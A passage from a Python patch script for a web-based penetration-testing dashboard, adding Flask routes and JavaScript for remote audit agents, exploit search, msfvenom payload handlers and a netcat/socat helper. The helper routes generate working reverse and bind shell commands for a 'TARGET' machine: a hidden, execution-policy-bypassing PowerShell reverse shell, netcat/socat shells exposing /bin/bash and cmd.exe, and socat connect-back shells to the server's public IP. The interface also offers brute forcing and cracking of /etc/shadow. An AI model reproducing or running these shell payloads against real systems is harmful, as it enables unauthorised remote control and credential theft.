            "reverse_shell_powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{server_ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"^> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "note": f"Server (this machine) is listening on port {port}. Run one of these on the TARGET.",
        }
    else:
        # Server connects → target should be listening
        target_host = host or "<TARGET_IP>"
        cmds = {
            "linux":   f"nc -lvnp {port}",
            "windows": f"ncat -lvnp {port}",
            "bind_shell_linux":   f"nc -lvnp {port} -e /bin/bash",
            "bind_shell_windows": f"ncat -lvnp {port} -e cmd.exe",
            "note": f"Run one of these on the TARGET first, then connect from server to {target_host}:{port}.",
        }
    return jsonify({"mode": mode, "commands": cmds})


@app.route("/api/socat/counterpart", methods=["POST"])
def socat_counterpart():
    """Return the socat command to run on the OTHER system."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    data = request.get_json() or {}
    left  = (data.get("left") or "").strip()
    right = (data.get("right") or "").strip()
    extra = (data.get("extra") or "").strip()

    server_ip = _get_public_ip()

    # Detect common patterns and generate counterpart
    cmds = {}
    left_u = left.upper()

    if "TCP-LISTEN" in left_u:
        # Extract port
        port_match = re.search(r":(\d+)", left)
        port = port_match.group(1) if port_match else "4444"
        cmds = {
            "connect_back":    f"socat TCP:{server_ip}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "connect_stdin":   f"socat TCP:{server_ip}:{port} STDIN",
            "port_forward_eg": f"socat TCP:{server_ip}:{port} TCP:<OTHER_HOST>:<OTHER_PORT>",
            "note": f"Server is listening. Run one of these on the TARGET to connect back to {server_ip}:{port}.",
        }
    elif "TCP:" in left_u:
        # Extract port from right or left
        port_match = re.search(r":(\d+)", right or left)
        port = port_match.group(1) if port_match else "4444"
        cmds = {
            "listener":       f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "simple_listener": f"socat TCP-LISTEN:{port},reuseaddr STDOUT",
            "note": f"Run this on the TARGET to accept incoming socat connections on port {port}.",
        }
    else:
        cmds = {
            "generic_linux_listener": f"socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "generic_connect":        f"socat TCP:{server_ip}:4444 STDIN",
            "note": "Generic counterpart commands. Adjust port and addresses as needed.",
        }

    return jsonify({"commands": cmds, "server_ip": server_ip})

'''

# ════════════════════════════════════════════════════════════
# Helper: find the injection point in api_server.py
# We inject all new routes BEFORE the health check route.
# ════════════════════════════════════════════════════════════

INJECT_BEFORE = '@app.route("/health")\ndef health():'

INJECT_NEW = (
    AUDIT_AGENT_ROUTES
    + SEARCHSPLOIT_FORMAT_ROUTE
    + SECLISTS_FULL_ROUTE
    + MSFVENOM_ROUTE
    + NC_SOCAT_ROUTE
    + '\n\n'
    + '@app.route("/health")\ndef health():'
)

# ════════════════════════════════════════════════════════════
# PATCH 7 — Remove Radare2 from ALLOWED_CLI_COMMANDS + nav
# ════════════════════════════════════════════════════════════

RADARE2_NAV_OLD = '''          <button class="nav-item" id="ni-radare2" onclick="pg(\'radare2\',this)"><span class="ni">&#9675;</span> Radare2</button>'''
RADARE2_NAV_NEW = '''          <!-- Radare2 removed -->'''

RADARE2_CATALOG_OLD = '''  {label:'REVERSE ENGINEERING',color:'#00ff9d',tools:[['radare2','Radare2','Reverse engineering framework']]},'''
RADARE2_CATALOG_NEW = '''  /* Reverse Engineering section removed */'''

RADARE2_NAV_SECTION_OLD = '''      <div class="nav-section">
        <div class="nav-cat-toggle" onclick="navToggle(\'reverseeng\')">
          <span class="nav-cat-label">REVERSE ENGINEERING</span>
          <span class="nav-cat-arrow" id="na-reverseeng">&#9660;</span>
        </div>
        <div class="nav-cat-items collapsed" id="nc-reverseeng" style="max-height:0">
          <button class="nav-item" id="ni-radare2" onclick="pg(\'radare2\',this)"><span class="ni">&#9675;</span> Radare2</button>
        </div>
      </div>'''
RADARE2_NAV_SECTION_NEW = '''      <!-- Reverse Engineering nav section removed -->'''

# ════════════════════════════════════════════════════════════
# PATCH 8 — Legion module buttons — add finger back, fix alignment
# ════════════════════════════════════════════════════════════

LEGION_PILLS_OLD = '''          <div class="pills" style="margin-top:6px">
              <button class="pill on" id="lg-mod-nmap" onclick="lgMod(\'nmap\',this)">nmap</button>
              <button class="pill on" id="lg-mod-nikto" onclick="lgMod(\'nikto\',this)">nikto</button>
              <button class="pill on" id="lg-mod-smb" onclick="lgMod(\'smb\',this)">SMB</button>
              <button class="pill on" id="lg-mod-snmp" onclick="lgMod(\'snmp\',this)">SNMP</button>
              <button class="pill" id="lg-mod-hydra" onclick="lgMod(\'hydra\',this)">hydra</button>
              <button class="pill" id="lg-mod-finger" onclick="lgMod(\'finger\',this)">finger</button>
            </div>'''
LEGION_PILLS_NEW = '''          <div class="pills" style="margin-top:6px">
              <button class="pill on" id="lg-mod-nmap" onclick="lgMod(\'nmap\',this)" title="nmap port scanner">nmap</button>
              <button class="pill on" id="lg-mod-nikto" onclick="lgMod(\'nikto\',this)" title="web vulnerability scanner">nikto</button>
              <button class="pill on" id="lg-mod-smb" onclick="lgMod(\'smb\',this)" title="smbclient / enum4linux SMB enum">SMB (smbclient)</button>
              <button class="pill on" id="lg-mod-snmp" onclick="lgMod(\'snmp\',this)" title="snmpwalk / onesixtyone SNMP enum">SNMP (snmpwalk)</button>
              <button class="pill" id="lg-mod-hydra" onclick="lgMod(\'hydra\',this)" title="hydra credential brute force (light)">hydra</button>
              <button class="pill" id="lg-mod-finger" onclick="lgMod(\'finger\',this)" title="finger user enumeration">finger</button>
            </div>
            <div style="font-size:11px;color:var(--text3);margin-top:6px">
              &#9432; SMB uses smbclient/enum4linux &middot; SNMP uses snmpwalk/onesixtyone &middot; Hydra uses light 5×5 SSH test
            </div>'''


# ════════════════════════════════════════════════════════════
# JS PATCH — inject new JavaScript functions into the HTML
# These handle: Remote Audit panel, SearchSploit table, SecLists
# full download, msfvenom auto-options, Netcat/Socat counterparts.
# ════════════════════════════════════════════════════════════

JS_INJECTION_MARKER = "loadUser();\nsetTimeout(renderHomeToolCatalog,120);"

JS_INJECTION_NEW = r"""loadUser();
setTimeout(renderHomeToolCatalog,120);

/* ════════════════════════════════════════════════════════
   REMOTE AUDIT PANEL (Universal Agent)
   ════════════════════════════════════════════════════════ */
var _raSelectedAgent='';
var _raAgentTools={};

async function loadRemoteAuditAgents(){
  var box=document.getElementById('ra-agents-panel');
  if(!box)return;
  try{
    var r=await fetch('/api/remote/agents');
    var d=await r.json();
    var agents=d.agents||[];
    if(!agents.length){
      box.innerHTML='<div style="color:var(--text3);font-size:12px">No agents connected. Install universal agent on target system using the install command above.</div>';
      return;
    }
    var html='<div style="display:flex;flex-direction:column;gap:6px">';
    agents.forEach(function(a){
      var st=(a.status||'unknown').toLowerCase();
      var col=st==='online'?'var(--green)':'var(--orange)';
      var sel=(_raSelectedAgent===a.client_id);
      var tools=(a.tools||[]).slice(0,12).join(', ')||'(checking...)';
      html+='<div class="card-p" style="border:2px solid '+(sel?'var(--green)':'var(--border)')+';border-radius:8px;cursor:pointer" onclick="raPickAgent(\''+a.client_id+'\')">'
        +'<div style="display:flex;justify-content:space-between">'
        +'<div><strong style="color:var(--text)">'+a.client_id+'</strong>'
        +(sel?' <span style="color:var(--green);font-size:10px">● SELECTED</span>':'')
        +'<div style="font-size:11px;color:var(--text3)">'+( a.hostname||'')+(a.os_info?' · '+a.os_info:'')+'</div>'
        +'<div style="font-size:10px;color:var(--text3);margin-top:3px">Tools: '+tools+'</div></div>'
        +'<div style="font-size:11px;color:'+col+';flex-shrink:0">'+st.toUpperCase()+'</div></div>'
        +'<div style="font-size:10px;color:var(--text3);margin-top:4px">IP: '+(a.ip_seen||'--')+' · Last: '+(a.last_seen||'--')+'</div>'
        +'<div style="margin-top:8px;display:flex;gap:6px">'
        +'<button class="btn btn-outline btn-sm" onclick="event.stopPropagation();raDisconnect(\''+a.client_id+'\')">DISCONNECT</button>'
        +'</div></div>';
    });
    html+='</div>';
    box.innerHTML=html;
  }catch(e){
    if(box)box.innerHTML='<div class="err-box visible">Failed to load agents: '+e.message+'</div>';
  }
}

async function raPickAgent(clientId){
  _raSelectedAgent=clientId;
  var lbl=document.getElementById('ra-selected-lbl');
  if(lbl)lbl.textContent='Selected: '+clientId;
  // Load tool list for this agent
  try{
    var r=await fetch('/api/remote/agent-tools/'+encodeURIComponent(clientId));
    var d=await r.json();
    _raAgentTools[clientId]=d.installed_tools||[];
    renderRaToolGrid(d.installed_tools||[], d.catalog||{});
  }catch(e){}
  loadRemoteAuditAgents();
}

function renderRaToolGrid(installed, catalog){
  var box=document.getElementById('ra-tool-grid');
  if(!box)return;
  var cats={audit:'AUDITING',network:'NETWORK',web:'WEB TESTING',password:'PASSWORD',osint:'OSINT',exploit:'EXPLOIT'};
  var bycat={};
  Object.entries(catalog).forEach(function(kv){
    var key=kv[0],tool=kv[1];
    if(!bycat[tool.category])bycat[tool.category]=[];
    bycat[tool.category].push({key:key,...tool});
  });
  var html='';
  Object.entries(cats).forEach(function(cv){
    var catKey=cv[0],catLabel=cv[1];
    var tools=(bycat[catKey]||[]);
    if(!tools.length)return;
    html+='<div style="margin-bottom:14px"><div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:6px">'+catLabel+'</div><div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:6px">';
    tools.forEach(function(t){
      var isInstalled=installed.indexOf(t.key)>=0||installed.indexOf(t.key.toLowerCase())>=0;
      html+='<div class="home-tool-card" style="opacity:'+(isInstalled?1:0.5)+';border-color:'+(isInstalled?'var(--border)':'var(--border)')+'" onclick="raSelectTool(\''+t.key+'\')" title="'+(isInstalled?'Installed':'May not be installed')+'">'
        +'<div style="font-size:12px;font-weight:600;color:var(--text)">'+(t.icon||'')+'  '+t.label+'</div>'
        +'<div style="font-size:10px;color:var(--text3)">'+t.desc+'</div>'
        +(isInstalled?'<div style="font-size:9px;color:var(--green);margin-top:3px">● installed</div>':'<div style="font-size:9px;color:var(--text3);margin-top:3px">○ may need install</div>')
        +'</div>';
    });
    html+='</div></div>';
  });
  box.innerHTML=html;
}

var _raSelectedTool='';
function raSelectTool(tool){
  _raSelectedTool=tool;
  var lbl=document.getElementById('ra-tool-lbl');
  if(lbl)lbl.textContent='Tool: '+tool;
  var opts=document.getElementById('ra-tool-opts');
  if(!opts)return;
  // Show tool-specific options
  var TOOL_OPTS={
    lynis: '<div class="fg"><label>PROFILE</label><select class="inp inp-mono" id="ra-opt-profile"><option value="system">Full System</option><option value="quick">Quick</option><option value="forensics">Forensics</option></select></div><div class="fg"><label>COMPLIANCE</label><select class="inp inp-mono" id="ra-opt-compliance"><option value="">None</option><option value="ISO27001">ISO 27001</option><option value="PCI-DSS">PCI-DSS</option><option value="HIPAA">HIPAA</option><option value="CIS">CIS Benchmark</option></select></div>',
    nmap: '<div class="fg"><label>TARGET (IP or hostname)</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="192.168.1.1 or example.com"/></div><div class="fg"><label>PROFILE</label><select class="inp inp-mono" id="ra-opt-profile"><option value="fast">Fast</option><option value="balanced" selected>Balanced</option><option value="deep">Deep</option></select></div>',
    nikto: '<div class="fg"><label>TARGET URL</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="http://192.168.1.1"/></div><div class="fg"><label>PORT</label><input class="inp inp-mono" id="ra-opt-port" type="number" value="80"/></div>',
    sqlmap: '<div class="fg"><label>TARGET URL</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="http://example.com/page?id=1"/></div>',
    nuclei: '<div class="fg"><label>TARGET URL</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="https://example.com"/></div><div class="fg"><label>SEVERITY</label><select class="inp inp-mono" id="ra-opt-severity"><option value="critical,high">Critical + High</option><option value="critical,high,medium" selected>Critical + High + Medium</option></select></div>',
    whatweb: '<div class="fg"><label>TARGET URL</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="https://example.com"/></div>',
    dnsrecon: '<div class="fg"><label>DOMAIN</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="example.com"/></div>',
    theharvester: '<div class="fg"><label>DOMAIN</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="example.com"/></div><div class="fg"><label>SOURCES</label><input class="inp inp-mono" id="ra-opt-sources" value="google,bing,crtsh"/></div>',
    ffuf: '<div class="fg"><label>URL (use FUZZ)</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="http://target.com/FUZZ"/></div>',
    medusa: '<div class="fg"><label>HOST</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="192.168.1.1"/></div><div class="fg"><label>MODULE</label><select class="inp inp-mono" id="ra-opt-module"><option>ssh</option><option>ftp</option><option>http</option><option>smb</option></select></div>',
    hashcat: '<div class="fg"><label>HASH</label><input class="inp inp-mono" id="ra-opt-hash" type="text" placeholder="5f4dcc3b5aa765d61d8327deb882cf99"/></div><div class="fg"><label>HASH TYPE (-m)</label><input class="inp inp-mono" id="ra-opt-hashtype" value="0"/></div>',
    john: '<div class="fg"><label>HASH FILE PATH (on remote)</label><input class="inp inp-mono" id="ra-opt-hashfile" type="text" placeholder="/etc/shadow"/></div>',
    wpscan: '<div class="fg"><label>TARGET URL</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="https://example.com"/></div>',
    hping3: '<div class="fg"><label>TARGET HOST</label><input class="inp inp-mono" id="ra-opt-target" type="text" placeholder="192.168.1.1"/></div><div class="fg"><label>PORT</label><input class="inp inp-mono" id="ra-opt-port" value="80"/></div>',
    searchsploit: '<div class="fg"><label>SEARCH QUERY</label><input class="inp inp-mono" id="ra-opt-query" type="text" placeholder="apache 2.4"/></div>',
    chkrootkit: '<div style="color:var(--text3);font-size:12px">chkrootkit runs with default settings — no options required.</div>',
    rkhunter: '<div style="color:var(--text3);font-size:12px">rkhunter runs full check — no options required.</div>',
  };
  opts.innerHTML=TOOL_OPTS[tool]||('<div style="color:var(--text3);font-size:12px">Run '+tool+' with default settings on the remote system.</div>');
}

function _raCollectArgs(){
  var args={};
  var fields=['target','port','profile','compliance','severity','module','sources','hash','hashtype','hashfile','query'];
  fields.forEach(function(f){
    var el=document.getElementById('ra-opt-'+f);
    if(el&&el.value.trim())args[f]=el.value.trim();
  });
  return args;
}

async function raRunTool(){
  if(!_raSelectedAgent){showToast('No agent selected','Pick an agent system first','warning');return;}
  if(!_raSelectedTool){showToast('No tool selected','Click a tool from the grid','warning');return;}
  var btn=document.getElementById('ra-run-btn');
  if(btn){btn.disabled=true;btn.innerHTML='<span class="spin"></span> Queuing...';}
  var args=_raCollectArgs();
  try{
    var r=await fetch('/api/remote/run-audit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:_raSelectedAgent,tool:_raSelectedTool,args:args})});
    var d=await r.json();
    if(d.error){showToast('Error',d.error,'error');}
    else{
      showToast('Job Queued','Job #'+d.job_id+' queued for '+d.tool_label,'success',5000);
      loadRaJobs();
    }
  }catch(e){showToast('Error',e.message,'error');}
  finally{if(btn){btn.disabled=false;btn.innerHTML='▶ RUN ON REMOTE SYSTEM';}}
}

async function loadRaJobs(){
  var box=document.getElementById('ra-jobs-panel');if(!box)return;
  try{
    var qs=_raSelectedAgent?'?client_id='+encodeURIComponent(_raSelectedAgent):'';
    var r=await fetch('/api/remote/jobs-overview'+qs);
    var d=await r.json();
    var jobs=d.jobs||[];
    if(!jobs.length){box.innerHTML='<div style="color:var(--text3);font-size:12px">No jobs yet.</div>';return;}
    var html='<div style="display:flex;flex-direction:column;gap:6px">';
    jobs.forEach(function(j){
      var st=(j.status||'unknown').toLowerCase();
      var col=st==='completed'?'var(--green)':st==='running'?'var(--yellow)':st==='pending'?'var(--orange)':'var(--text3)';
      var canView=(st==='completed'||st==='failed'||st==='cancelled');
      var canCancel=(st==='pending'||st==='running');
      html+='<div class="card-p" style="border:1px solid var(--border);border-radius:8px">'
        +'<div style="display:flex;justify-content:space-between">'
        +'<strong>Job #'+j.id+' · <span style="font-family:var(--mono)">'+j.tool+'</span> on <span style="font-family:var(--mono)">'+j.client_id+'</span></strong>'
        +'<span style="color:'+col+';font-size:11px">'+st.toUpperCase()+'</span></div>'
        +'<div style="font-size:11px;color:var(--text3)">'+( j.progress_pct||0)+'% · '+(j.message||'')+'</div>'
        +'<div style="font-size:10px;color:var(--text3)">'+( j.created_at||'')+'</div>'
        +'<div style="margin-top:6px;display:flex;gap:5px">'
        +(canView?'<button class="btn btn-outline btn-sm" onclick="viewRaJob('+j.id+')">VIEW OUTPUT</button>':'')
        +(canCancel?'<button class="btn btn-outline btn-sm" onclick="cancelRaJob('+j.id+')" style="color:var(--red)">CANCEL</button>':'')
        +'</div></div>';
    });
    html+='</div>';
    box.innerHTML=html;
  }catch(e){if(box)box.innerHTML='<div class="err-box visible">'+e.message+'</div>';}
}

async function viewRaJob(jobId){
  try{
    var r=await fetch('/api/remote/job-status/'+jobId);
    var d=await r.json();
    if(d.error){showToast('Error',d.error,'error');return;}
    var out=document.getElementById('ra-output-panel');
    if(!out)return;
    out.innerHTML='<div class="card card-p"><div class="card-title" style="margin-bottom:8px">Job #'+jobId+' — '+d.tool+' on '+d.client_id+'</div>'
      +'<div style="font-size:11px;color:var(--text3);margin-bottom:8px">Status: '+d.status+' · Exit: '+(d.exit_code!=null?d.exit_code:'?')+'</div>'
      +(d.error?'<div style="color:var(--red);font-size:12px;margin-bottom:8px">'+d.error+'</div>':'')
      +'<pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2);max-height:500px;overflow-y:auto">'+(d.output||'(no output)')+'</pre></div>';
    out.scrollIntoView({behavior:'smooth'});
  }catch(e){showToast('Error',e.message,'error');}
}

async function cancelRaJob(jobId){
  if(!confirm('Cancel job #'+jobId+'?'))return;
  try{
    var r=await fetch('/api/remote/jobs/'+jobId+'/cancel',{method:'POST'});
    var d=await r.json();
    if(d.ok)loadRaJobs();
    else showToast('Error',d.error,'error');
  }catch(e){showToast('Error',e.message,'error');}
}

async function raDisconnect(clientId){
  if(!confirm('Disconnect '+clientId+'?'))return;
  try{
    var r=await fetch('/api/remote/agents/'+encodeURIComponent(clientId)+'/disconnect',{method:'POST'});
    var d=await r.json();
    if(d.ok){if(_raSelectedAgent===clientId){_raSelectedAgent='';} loadRemoteAuditAgents();}
    else showToast('Error',d.error,'error');
  }catch(e){showToast('Error',e.message,'error');}
}

/* ═══ SearchSploit formatted table ═══════════════════════ */
async function runSearchsploitFormatted(){
  var query=document.getElementById('searchsploit-query').value.trim();
  var cve=document.getElementById('searchsploit-cve').value.trim();
  var type=document.getElementById('searchsploit-type').value||'';
  var platform=document.getElementById('searchsploit-platform').value||'';
  var strict=document.getElementById('searchsploit-strict').classList.contains('on');
  var cs=document.getElementById('searchsploit-case').classList.contains('on');
  if(!query&&!cve){alert('Enter a search query or CVE');return;}
  var btn=document.getElementById('searchsploit-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Searching...';
  var t=mkTool('searchsploit');t.start();t.log('searchsploit: '+(cve||query),'i');
  try{
    var r=await fetchWithTimeout('/api/searchsploit/format',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({query:query,cve:cve,type:type,platform:platform,strict:strict,case_sensitive:cs})
    },70000,'searchsploit');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);return;}
    if(!d.results||!d.results.length){t.log('No exploits found for: '+(cve||query),'w');t.res('<div style="color:var(--text3);font-size:12px">No exploits found.</div>');return;}
    t.log('Found '+d.total+' result(s)','s');
    var SEV_COLORS={'exploit':'var(--red)','shellcode':'var(--orange)','paper':'var(--blue)'};
    var html='<div class="card"><div class="card-header"><div class="card-title">Results for: '+(cve||query)+' ('+d.total+')</div></div>'
      +'<div class="tbl-wrap"><table class="tbl"><thead><tr>'
      +'<th>EDB-ID</th><th>TITLE</th><th>PLATFORM</th><th>TYPE</th><th>DATE</th><th>VERIFIED</th><th>LINK</th>'
      +'</tr></thead><tbody>';
    d.results.forEach(function(row){
      var tc=SEV_COLORS[row.type]||'var(--text3)';
      html+='<tr>'
        +'<td style="font-family:var(--mono);font-size:11px;color:var(--cyan)">'+(row.edb_id||'--')+'</td>'
        +'<td style="font-size:11px">'+row.title+'</td>'
        +'<td><span class="tag">'+(row.platform||'--')+'</span></td>'
        +'<td><span style="font-family:var(--mono);font-size:10px;color:'+tc+'">'+row.type+'</span></td>'
        +'<td style="font-family:var(--mono);font-size:10px;color:var(--text3)">'+(row.date||'--')+'</td>'
        +'<td style="text-align:center">'+(row.verified?'<span style="color:var(--green)">✓</span>':'')+'</td>'
        +'<td>'+(row.nvd_url?'<a href="'+row.nvd_url+'" target="_blank" style="font-family:var(--mono);font-size:10px;color:var(--cyan)">EDB ↗</a>':'')+'</td>'
        +'</tr>';
    });
    html+='</tbody></table></div></div>';
    t.res(html);
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}
}

/* Override old runSearchsploit with formatted version */
window.runSearchsploit=runSearchsploitFormatted;

/* ═══ SecLists full download ══════════════════════════════ */
async function seclistsDownloadFull(){
  var path=document.getElementById('seclists-path').value.trim();
  if(!path){return;}
  try{
    // Get line count first
    var rc=await fetch('/api/wordlist/count?path='+encodeURIComponent(path));
    var dc=await rc.json();
    if(dc.error){showToast('Error',dc.error,'error');return;}
    if(!confirm('Download full wordlist: '+dc.filename+'\n'+dc.line_count.toLocaleString()+' lines · '+(dc.size_bytes/1024).toFixed(1)+' KB')){return;}
    window.open('/api/wordlist/full?path='+encodeURIComponent(path),'_blank');
    showToast('Download started',dc.filename+' ('+dc.line_count.toLocaleString()+' lines)','success',4000);
  }catch(e){showToast('Error',e.message,'error');}
}

async function seclistsCopyPath(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{
      await navigator.clipboard.writeText(path);
      showToast('Copied','Full path copied to clipboard','success',2000);
    }catch(e){showToast('Path',path,'info',5000);}
  }
}

/* Override old seclistsCopy */
window.seclistsCopy=seclistsCopyPath;

/* ═══ msfvenom auto-options ═══════════════════════════════ */
var _msfPublicIP='';

async function msfAutoLoadPublicIP(){
  if(_msfPublicIP)return;
  try{
    var r=await fetch('/api/msfvenom/public-ip');
    var d=await r.json();
    _msfPublicIP=d.public_ip||'';
    var el=document.getElementById('msfvenom-lhost');
    if(el&&el.value===''){el.value=_msfPublicIP;}
  }catch(e){}
}

async function msfPayloadChanged(){
  var sel=document.getElementById('msfvenom-payload');
  var customP=document.getElementById('msfvenom-custom-payload');
  var payload=sel.value==='custom'?(customP.value||'').trim():sel.value;
  if(!payload)return;
  try{
    var r=await fetch('/api/msfvenom/payload-options?payload='+encodeURIComponent(payload));
    var d=await r.json();
    // Auto-fill format
    var fmtEl=document.getElementById('msfvenom-format');
    if(fmtEl&&d.format){
      for(var i=0;i<fmtEl.options.length;i++){
        if(fmtEl.options[i].value===d.format){fmtEl.selectedIndex=i;break;}
      }
    }
    // Auto-fill LHOST
    var lhostEl=document.getElementById('msfvenom-lhost');
    if(lhostEl&&d.lhost&&!lhostEl.value){lhostEl.value=d.lhost;}
    // Show run command
    showMsfRunCmd(d);
  }catch(e){}
}

function showMsfRunCmd(opts){
  var box=document.getElementById('msf-run-cmd-box');
  if(!box)return;
  box.style.display='block';
  var runEl=document.getElementById('msf-run-cmd');
  var handlerEl=document.getElementById('msf-handler-cmd');
  if(runEl)runEl.value=opts.run_cmd||'';
  if(handlerEl)handlerEl.value=opts.handler_cmd||'';
}

async function msfStartHandler(){
  var payload=document.getElementById('msfvenom-payload').value;
  if(payload==='custom'){payload=(document.getElementById('msfvenom-custom-payload').value||'').trim();}
  var lhost=document.getElementById('msfvenom-lhost').value||_msfPublicIP;
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  if(!payload){alert('Select a payload first');return;}
  var btn=document.getElementById('msf-start-handler-btn');
  if(btn){btn.disabled=true;btn.innerHTML='<span class="spin"></span> Starting listener...';}
  try{
    var r=await fetch('/api/msfvenom/start-handler',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({payload:payload,lhost:lhost,lport:lport})
    });
    var d=await r.json();
    if(d.error){showToast('Handler Error',d.error,'error');}
    else{
      showToast('Handler Started','Listening on '+lhost+':'+lport,'success',5000);
      _msfActiveSession=d.session_id;
      document.getElementById('msf-shell-panel').style.display='block';
      msfStartStream(d.session_id);
    }
  }catch(e){showToast('Error',e.message,'error');}
  finally{if(btn){btn.disabled=false;btn.innerHTML='▶ START HANDLER / LISTENER';}}
}

var _msfActiveSession='';
var _msfStreamES=null;

function msfStartStream(sid){
  if(_msfStreamES){_msfStreamES.close();_msfStreamES=null;}
  var out=document.getElementById('msf-shell-output');
  if(out)out.textContent='';
  _msfStreamES=new EventSource('/api/msfvenom/session/'+sid+'/stream');
  _msfStreamES.onmessage=function(e){
    try{
      var msg=JSON.parse(e.data);
      if(msg.type==='output'){
        var o=document.getElementById('msf-shell-output');
        if(o){o.textContent+=msg.text;o.scrollTop=o.scrollHeight;}
      }else if(msg.type==='exit'){
        var o2=document.getElementById('msf-shell-output');
        if(o2){o2.textContent+='\n[Session ended]\n';o2.scrollTop=o2.scrollHeight;}
        _msfStreamES.close();_msfStreamES=null;
      }
    }catch(ex){}
  };
  _msfStreamES.onerror=function(){
    if(_msfStreamES){_msfStreamES.close();_msfStreamES=null;}
  };
}

async function msfSendCmd(){
  var inp=document.getElementById('msf-cmd-input');
  if(!inp||!_msfActiveSession)return;
  var cmd=inp.value;
  if(!cmd&&cmd!=='0')return;
  inp.value='';
  var out=document.getElementById('msf-shell-output');
  if(out){out.textContent+='msf> '+cmd+'\n';out.scrollTop=out.scrollHeight;}
  try{
    await fetch('/api/msfvenom/session/'+_msfActiveSession+'/input',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({text:cmd})
    });
  }catch(e){}
}

function msfCmdKey(e){if(e.key==='Enter'){e.preventDefault();msfSendCmd();}}

async function msfKillSession(){
  if(!_msfActiveSession)return;
  try{
    await fetch('/api/msfvenom/session/'+_msfActiveSession+'/kill',{method:'POST'});
    _msfActiveSession='';
    if(_msfStreamES){_msfStreamES.close();_msfStreamES=null;}
    document.getElementById('msf-shell-panel').style.display='none';
    showToast('Session killed','','warning',2000);
  }catch(e){}
}

/* ═══ Netcat counterpart command ═════════════════════════ */
async function ncShowCounterpart(){
  var mode=document.getElementById('nc-mode').value;
  var host=document.getElementById('nc-host').value.trim();
  var port=document.getElementById('nc-port').value||'4444';
  var extra=document.getElementById('nc-extra').value.trim();
  try{
    var r=await fetch('/api/netcat/counterpart',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({mode:mode,host:host,port:port,extra:extra})
    });
    var d=await r.json();
    var cmds=d.commands||{};
    var box=document.getElementById('nc-counterpart-box');
    if(!box)return;
    var html='<div class="card card-p" style="border-left:3px solid var(--cyan);margin-top:10px">'
      +'<div class="card-title" style="margin-bottom:8px">⚡ Run on the OTHER system</div>'
      +'<div style="font-size:11px;color:var(--text3);margin-bottom:10px">'+cmds.note+'</div>';
    Object.entries(cmds).forEach(function(kv){
      if(kv[0]==='note')return;
      html+='<div style="margin-bottom:8px"><div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:1px;margin-bottom:3px">'+kv[0].toUpperCase().replace(/_/g,' ')+'</div>'
        +'<div style="display:flex;gap:6px;align-items:center">'
        +'<input class="inp inp-mono" style="flex:1;font-size:11px" type="text" readonly value="'+kv[1].replace(/"/g,'&quot;')+'"/>'
        +'<button class="btn btn-outline btn-sm" onclick="(function(){try{navigator.clipboard.writeText(\''+kv[1].replace(/'/g,"\\'")+'\')}catch(e){}})()">COPY</button>'
        +'</div></div>';
    });
    html+='</div>';
    box.innerHTML=html;
  }catch(e){showToast('Error',e.message,'error');}
}

/* ═══ Socat counterpart command ══════════════════════════ */
async function socatShowCounterpart(){
  var left=document.getElementById('sc-left').value.trim();
  var right=document.getElementById('sc-right').value.trim();
  var extra=document.getElementById('sc-extra').value.trim();
  try{
    var r=await fetch('/api/socat/counterpart',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({left:left,right:right,extra:extra})
    });
    var d=await r.json();
    var cmds=d.commands||{};
    var box=document.getElementById('sc-counterpart-box');
    if(!box)return;
    var html='<div class="card card-p" style="border-left:3px solid var(--cyan);margin-top:10px">'
      +'<div class="card-title" style="margin-bottom:8px">⚡ Run on the OTHER system (server IP: '+d.server_ip+')</div>'
      +'<div style="font-size:11px;color:var(--text3);margin-bottom:10px">'+cmds.note+'</div>';
    Object.entries(cmds).forEach(function(kv){
      if(kv[0]==='note')return;
      html+='<div style="margin-bottom:8px"><div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:1px;margin-bottom:3px">'+kv[0].toUpperCase().replace(/_/g,' ')+'</div>'
        +'<div style="display:flex;gap:6px;align-items:center">'
        +'<input class="inp inp-mono" style="flex:1;font-size:11px" type="text" readonly value="'+kv[1].replace(/"/g,'&quot;')+'"/>'
